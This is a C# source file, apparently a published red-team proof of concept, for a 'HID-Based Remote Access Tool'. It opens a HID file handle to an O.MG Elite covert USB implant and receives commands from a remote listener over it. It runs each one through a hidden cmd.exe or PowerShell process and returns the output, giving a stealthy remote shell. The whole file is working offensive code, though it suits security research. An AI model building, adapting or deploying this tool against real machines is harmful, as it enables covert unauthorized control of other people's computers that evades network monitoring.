/*
Author: Ø1phor1³ (@01p8or13)
Acknowledgements: spiceywasabi, rogandawes, Kalani

https://github.com/0i41E
https://github.com/spiceywasabi
https://github.com/rogandawes
https://github.com/kalanihelekunihi

This code is a PoC for a bidirectional, shell-like connection between a Windows-Host and an O.MG Elite device, which acts as a bridge between Listener and USB-Host.
"https://github.com/O-MG/O.MG-Firmware/blob/stable/tools/HIDX/python/stealthlink-client-universal.py" is recommended as a listener due to the way data is send and received. Others, such as netcat, may not give a useable result.

Credits to Rogan for the concept, idea of filehandle and device identification
*/

using System;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32.SafeHandles;
using System.Collections.Generic;

namespace HIDXShell
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                HelpMenu();
                return;
            }

            // Default Values
            string vendorID = "D3C0";
            string productID = "D34D";
            bool verbose = false;
            bool powershell = false;

            // Valid parameters list
            HashSet<string> validParams = new HashSet<string> { "/vid", "/pid", "/verbose", "/powershell" };

            // Parse command line arguments
            for (int i = 0; i < args.Length; i++)
            {
                if (!validParams.Contains(args[i].ToLower()))
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($"[!] Error: Invalid parameter '{args[i]}'");
                    Console.ResetColor();
                    HelpMenu();
                    return;
                }

                switch (args[i].ToLower())
                {
                    case "/vid": // Vendor ID
                        if (i + 1 < args.Length)
                        {
                            vendorID = args[++i];
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /vid requires a value");
                            Console.ResetColor();
                            HelpMenu();
                            return;
                        }
                        break;
                    case "/pid": // Product ID
                        if (i + 1 < args.Length)
                        {
                            productID = args[++i];
                        }
                        else
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("[!] Error: /pid requires a value");
                            Console.ResetColor();
                            HelpMenu();
                            return;
                        }
                        break;
                    case "/verbose":
                        verbose = true;
                        break;
                    case "/powershell": // If used, use PowerShell
                        powershell = true;
                        break;
                }
            }

            try
            {
                RunShell(vendorID, productID, verbose, powershell);
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"[!] Error: {ex.Message}");
                Console.ResetColor();
            }
        }

        static void HelpMenu()
        {
            string text = @"
 _   _ _____________   __  _____ _             _ _   _       _     _       _    
| | | |_   _|  _  \ \ / / /  ___| |           | | | | |     | |   (_)     | |   
| |_| | | | | | | |\ V /  \ `--.| |_ ___  __ _| | |_| |__   | |    _ _ __ | | __
|  _  | | | | | | |/   \   `--. \ __/ _ \/ _` | | __| '_ \  | |   | | '_ \| |/ /
| | | |_| |_| |/ // /^\ \ /\__/ / ||  __/ (_| | | |_| | | | | |___| | | | |   < 
\_| |_/\___/|___/ \/   \/ \____/ \__\___|\__,_|_|\__|_| |_| \_____/_|_| |_|_|\_\
";
            Console.WriteLine(text);
            Console.WriteLine("HID-Based Remote Access Tool by Ø1phor1³");
            Console.WriteLine();
            Console.WriteLine("Usage: HIDXShell.exe /vid <VendorID> /pid <ProductID> /powershell /verbose");
            Console.WriteLine();
            Console.WriteLine("Parameters:");
            Console.WriteLine("  /vid:        Specify the Vendor ID of the target device (default: D3C0)");
            Console.WriteLine("  /pid:        Specify the Product ID of the target device (default: D34D)");
            Console.WriteLine("  /powershell: Use PowerShell.exe as the command line interface (optional, slower)");
            Console.WriteLine("  /verbose:    Enable verbose output (optional)");
            Console.WriteLine();
            Console.WriteLine("Example: HIDXShell.exe /vid D3C0 /pid D34D /powershell");
        }

        static void RunShell(string vendorID, string productID, bool verbose, bool powershell)
        {
            string omgDeviceID = $"{vendorID}&PID_{productID}";
            string deviceString = GetOMGDevice(omgDeviceID);

            // Verify device - error checking
            if (deviceString == null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[!] Error: No O.MG Device found! Check VID/PID.");
                Console.ResetColor();
                return;
            }

            // Display devicestring in console if successful
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Identified O.MG Device: {deviceString}");
            Console.ResetColor();

            using (FileStream fileHandle = HIDX.Open(deviceString))
            {
                // Verify file handle
                if (fileHandle == null)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: Filehandle is empty.");
                    Console.ResetColor();
                    return;
                }

                // Sending some indicator to the listener
                string initialMessage = "[+] Stealth Link Session Established!\n";
                SendMessage(fileHandle, initialMessage, verbose);

                while (true)
                {
                    string command = ReceiveCommand(fileHandle, verbose);

                    if (!string.IsNullOrWhiteSpace(command))
                    {
                        string output;
                        try
                        {
                            output = ExecuteCommand(command.Trim(), verbose, powershell); // Trim whitespace from command
                        }
                        catch (Exception ex)
                        {
                            output = $"[!] Error: {ex.Message}";
                        }

                        SendMessage(fileHandle, output, verbose);
                    }
                }
            }
        }

        // Identify O.MG device
        static string GetOMGDevice(string omgDeviceID)
        {
            string deviceString = null;

            ManagementObjectCollection devices;
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_USBControllerDevice"))
            {
                devices = searcher.Get();
            }

            foreach (ManagementObject device in devices)
            {
                var dependent = device["Dependent"].ToString();
                var wmiDevice = new ManagementObject(dependent);

                if (wmiDevice["DeviceID"].ToString().Contains(omgDeviceID) && wmiDevice["Service"] == null)
                {
                    deviceString = @"\\?\" + wmiDevice["DeviceID"].ToString().Replace(@"\", "#") + "#{4d1e55b2-f16f-11cf-88cb-001111000030}"; // GUID_DEVINTERFACE_HID
                    break;
                }
            }

            return deviceString;
        }

        static void SendMessage(FileStream fileHandle, string message, bool verbose)
        {
            byte[] outputBytes = Encoding.ASCII.GetBytes(message + "> "); // Creating a fake prompt
            int outputLength = outputBytes.Length;
            int outputChunkSize = 8; // Kept at 8 for best experience
            int outputChunkNr = (int)Math.Ceiling((double)outputLength / outputChunkSize);

            if (verbose)
            {
                Console.WriteLine($"[i] Output of {outputLength} bytes sent in {outputChunkNr} packets.");
            }

            for (int i = 0; i < outputChunkNr; i++)
            {
                byte[] outputBytesToSend = new byte[65];
                int outputStart = i * outputChunkSize;
                int outputEnd = Math.Min((i + 1) * outputChunkSize, outputLength);
                int outputChunkLen = outputEnd - outputStart;

                Buffer.BlockCopy(outputBytes, outputStart, outputBytesToSend, 1, outputChunkLen);

                fileHandle.Write(outputBytesToSend, 0, 65);
            }
        }

        static string ReceiveCommand(FileStream fileHandle, bool verbose)
        {
            StringBuilder command = new StringBuilder();
            bool commandComplete = false;

            while (!commandComplete)
            {
                byte[] bytes = new byte[65];
                fileHandle.Read(bytes, 0, 65);

                foreach (byte b in bytes)
                {
                    char c = (char)b;
                    if ((c >= 32 && c <= 126) || c == 10)
                    {
                        command.Append(c);
                    }
                }

                // Checking for new-line
                if (command.ToString().Contains("\n"))
                {
                    commandComplete = true;
                }
            }

            return command.ToString();
        }

        static string ExecuteCommand(string command, bool verbose, bool powershell)
        {
            if (verbose)
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine($"[+] Executed command: {command}"); // Display executed command
                Console.ResetColor();
            }

            using (System.Diagnostics.Process process = new System.Diagnostics.Process())
            {
                // Powershell -> More powerful, but way slower than cmd
                process.StartInfo.FileName = powershell ? "powershell.exe" : "cmd.exe";
                process.StartInfo.Arguments = powershell ? $"-NoProfile -C \"{command}\"" : $"/c {command}";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true; // Redirect standard error, so user can see errors
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();

                if (!string.IsNullOrEmpty(error))
                {
                    output += Environment.NewLine + "[!] Error: " + error;
                }

                return output;
            }
        }
    }

    // File handle by Rogan
    public static class HIDX
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern SafeFileHandle CreateFile(
            string fileName,
            uint desiredAccess,
            int shareMode,
            IntPtr securityAttributes,
            int creationDisposition,
            uint flagsAndAttributes,
            IntPtr templateFile);
        public static FileStream Open(string fileName)
        {
            SafeFileHandle handle = CreateFile(
                fileName,
                0xC0000000,
                3,
                IntPtr.Zero,
                3,
                0x40000000,
                IntPtr.Zero);

            if (handle.IsInvalid)
            {
                throw new IOException($"Unable to open file handle. Error: {Marshal.GetLastWin32Error()}");
            }

            return new FileStream(handle, FileAccess.ReadWrite, 3, true);
        }
    }
}
